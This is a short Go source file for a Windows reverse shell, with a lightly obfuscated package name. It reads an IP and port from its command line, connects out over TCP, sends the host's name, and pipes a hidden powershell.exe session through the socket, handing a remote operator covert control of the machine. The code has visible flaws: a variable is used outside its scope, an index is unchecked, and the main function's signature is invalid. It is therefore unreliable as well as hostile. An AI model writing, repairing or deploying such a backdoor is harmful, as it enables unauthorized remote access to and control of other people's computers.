package oGllehS_EXE

import (
	"C"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
	"syscall"
)

func main(hwnd uintptr, hinst uintptr, lpszCmdLine *C.char, nCmdShow int32) {
	// Parse command-line arguments

	serverIP := ""
	serverPort := ""

	args := C.GoString(lpszCmdLine)
	parts := strings.Split(args, " ")

	if len(parts) != 0 {
		serverIP = parts[0]
		serverPort = parts[1]
		address := fmt.Sprintf("%s:%s", serverIP, serverPort)
	}

	// Connect to the server
	conn, err := net.Dial("tcp", address)
	if err != nil {
		fmt.Printf("Error connecting to server: %v\n", err)
		return
	}
	defer conn.Close()

	hostname, _ := os.Hostname()
	conn.Write([]byte("Connected to host: " + hostname + "\n"))

	// Set the shell
	shell := "powershell.exe"

	// Create the command to execute the shell
	cmd := exec.Command(shell)
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	// Set the process to be hidden
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}

	// Start the shell process
	if err := cmd.Run(); err != nil {
		fmt.Printf("Error starting shell: %v\n", err)
	}

	fmt.Printf("Connected to server at %s\n", address)
}
